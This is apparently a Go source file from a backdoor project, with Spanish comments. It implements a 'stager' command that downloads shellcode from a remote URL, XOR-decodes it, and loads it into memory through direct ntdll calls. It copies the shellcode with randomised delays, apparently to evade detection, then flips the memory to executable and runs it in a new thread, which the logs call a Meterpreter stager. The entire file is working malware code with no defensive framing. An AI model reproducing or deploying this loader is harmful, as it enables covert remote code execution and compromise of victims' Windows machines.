package handler

import (
	"backdoor/transport"
	"bufio"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

func StagerHandler(t transport.Transport, args []string) {
	if len(args) == 0 {
		t.Write([]byte("Uso: stager <URL>\n"))
		return
	}
	url := args[0]
	log.Printf("[*] Ejecutando stager desde URL: %s", url)

	err := RunMeterpreterStager(url)
	if err != nil {
		log.Printf("Error ejecutando stager: " + err.Error() + "\n")
		t.Write([]byte("Error ejecutando stager: " + err.Error() + "\n"))
	} else {
		t.Write([]byte("Stager ejecutado exitosamente\n"))
	}

	// Espera explícita para depuración o evitar cierre inmediato
	t.Write([]byte("Presiona enter para continuar...\n"))
	bufio.NewReader(os.Stdin).ReadBytes('\n')

	// Si querés detener el programa después del stager:
	// os.Exit(0)
}

func RunMeterpreterStager(url string) error {
	log.Println("[*] Descargando shellcode > ", url)

	resp, err := http.Get(url)
	if err != nil {
		log.Printf("Error al descargar el shellcode: %v", err)
		return err
	}
	defer resp.Body.Close()

	shellcode, err := io.ReadAll(resp.Body)
	if err != nil {
		log.Printf("Error al leer shellcode: %v", err)
		return err
	}

	if len(shellcode) == 0 {
		log.Printf("Shellcode vacío")
		return fmt.Errorf("shellcode vacío")
	}

	// 🔓 XOR-decodificación
	key := byte(0xAA)
	for i := range shellcode {
		shellcode[i] ^= key
	}

	// 🧠 NtDLL: NtAllocateVirtualMemory + NtCreateThreadEx + NtProtectVirtualMemory
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")

	var baseAddress uintptr
	regionSize := uintptr(len(shellcode))
	currentProcess := uintptr(0xffffffffffffffff) // Pseudo-handle

	// 🛠 NtAllocateVirtualMemory → RW only
	status, _, _ := ntAllocateVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		MEM_COMMIT|MEM_RESERVE,
		0x04, // PAGE_READWRITE
	)
	if status != 0 {
		log.Printf("NtAllocateVirtualMemory falló: 0x%x", status)
		return fmt.Errorf("NtAllocateVirtualMemory falló: 0x%x", status)
	}

	log.Printf("Memoria RW alocada en: 0x%x", baseAddress)

	// 🧪 Copia fragmentada
	mem := unsafe.Slice((*byte)(unsafe.Pointer(baseAddress)), len(shellcode))
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(shellcode); i++ {
		mem[i] = shellcode[i]
		time.Sleep(time.Duration(rand.Intn(15)+5) * time.Millisecond)
	}

	// 🔒 Cambiar permisos RW → RX
	oldProtect := uintptr(0)
	status, _, _ = ntProtectVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&baseAddress)),
		uintptr(unsafe.Pointer(&regionSize)),
		0x20, // PAGE_EXECUTE_READ
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if status != 0 {
		log.Printf("NtProtectVirtualMemory falló: 0x%x", status)
		return fmt.Errorf("NtProtectVirtualMemory falló: 0x%x", status)
	}
	log.Println("Protección cambiada a RX (PAGE_EXECUTE_READ)")

	// 🚀 Ejecutar con NtCreateThreadEx
	var hThread uintptr
	status, _, _ = ntCreateThreadEx.Call(
		uintptr(unsafe.Pointer(&hThread)),
		0x1FFFFF,
		0,
		currentProcess,
		baseAddress,
		0, 0, 0, 0, 0,
	)
	if status != 0 {
		log.Printf("NtCreateThreadEx falló: 0x%x", status)
		return fmt.Errorf("NtCreateThreadEx falló: 0x%x", status)
	}

	log.Println("[+] Shellcode ejecutado con NtCreateThreadEx")
	return nil
}

// Función auxiliar
func waitForEnter() {
	fmt.Println("Presiona Enter para salir...")
	bufio.NewReader(os.Stdin).ReadBytes('\n')
}
